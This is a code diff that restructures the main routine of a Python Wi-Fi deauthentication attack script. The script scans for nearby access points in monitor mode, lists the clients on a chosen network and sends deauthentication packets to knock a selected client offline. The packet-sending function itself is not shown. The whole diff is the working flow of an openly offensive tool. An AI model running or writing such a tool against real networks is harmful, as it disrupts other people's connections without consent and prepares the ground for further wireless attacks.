@@ -27,7 +27,8 @@ clients_counter = 1 #Index for each client
 
 networks_dic = {}
 networks_counter = 1 #Index for each network
-target_ap = ""
+
+target_ap = "" #Target access point
 
 # Initialize the networks dataframe that will contain all access points nearby
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "INDEX"])
@@ -143,48 +144,51 @@ if __name__ == "__main__":
     if len(sys.argv) != 2:
         print ("Usage: sudo python3 deauthentication-attack.py <INTERFACE>")
         exit(0)
+
+    #Load list of manufacturers to a dictionary
+    load_manufacturers()
+
+    interface = sys.argv[1]
+    #Set interface in monitor mode
+    change_to_monitor(interface)
+    channel_changer = Thread(target=change_channel)
+    channel_changer.daemon = True
+    channel_changer.start()
+    sniffer = AsyncSniffer(prn=callback, iface=interface)
+    sniffer.start()
+    time_to_sniff = 10
+    counter = time_to_sniff
+    print("Scanning for available networks", end='', flush=True)
+    while counter >= 0:
+        counter = counter-1
+        time.sleep(1)
+        print(".", end='', flush=True)
+    sniffer.stop()
+    os.system("clear")
+
+    print("====================================================================")
+    print(networks)
+    print("====================================================================", end='\n\n')
+
+    index = get_index_input("Choose network index to scan for connected clients", networks_dic)
+    #Extract the name of network based on it's index in the data frame
+    ssid = networks[networks['INDEX']==index]['SSID'].values[0]
+    #Extract the MAC address of that network
+    bssid = networks.index[index - 1]
+    print("Scanning for available clients at network '{}' ({})...".format(ssid, bssid))
+
+    #Get the target AP MAC address
+    target_ap = networks_dic[index]
+
+    sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 7)
+    print("Scan finished.")
+    if(not observed_clients):
+        print("Couldn't find clients on network '{}'. Try run the script again.".format(ssid))
     else:
-        #Load list of manufacturers to a dictionary
-        load_manufacturers()
-
-        interface = sys.argv[1]
-        change_to_monitor(interface)
-        channel_changer = Thread(target=change_channel)
-        channel_changer.daemon = True
-        channel_changer.start()
-        sniffer = AsyncSniffer(prn=callback, iface=interface)
-        sniffer.start()
-        time_to_sniff = 10
-        counter = time_to_sniff
-        print("Scanning for available networks", end='', flush=True)
-        while counter >= 0:
-            counter = counter-1
-            time.sleep(1)
-            print(".", end='', flush=True)
-        sniffer.stop()
-        os.system("clear")
-
-        print("================================================================")
-        print(networks)
-        print("================================================================", end='\n\n')
-
-        index = get_index_input("Choose network index to scan for connected clients", networks_dic)
-        #Extract the name of network based on it's index in the data frame
-        ssid = networks[networks['INDEX']==index]['SSID'].values[0]
-        print("Scanning for available clients at network '{}'...".format(ssid))
-
-        #Get the target AP MAC address
-        target_ap = networks_dic[index]
-
-        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 7)
-        print("Scan finished.")
-        if(not observed_clients):
-            print("Couldn't find clients on network '{}'. Try run the script again.".format(ssid))
-        else:
-            client_ind = get_index_input("Choose client index to start the attack", observed_clients)
-            print("Starting to attack client '{}'".format(observed_clients[client_ind]), end='', flush=True)
-            #Send de-authentication packets
-            run_deauthenticate(interface, observed_clients[client_ind], target_ap)
-            print("Done")
+        client_ind = get_index_input("Choose client index to start the attack", observed_clients)
+        print("Starting to attack client '{}'".format(observed_clients[client_ind]), end='', flush=True)
+        #Send de-authentication packets
+        run_deauthenticate(interface, observed_clients[client_ind], target_ap)
+        print("Done")
 
 
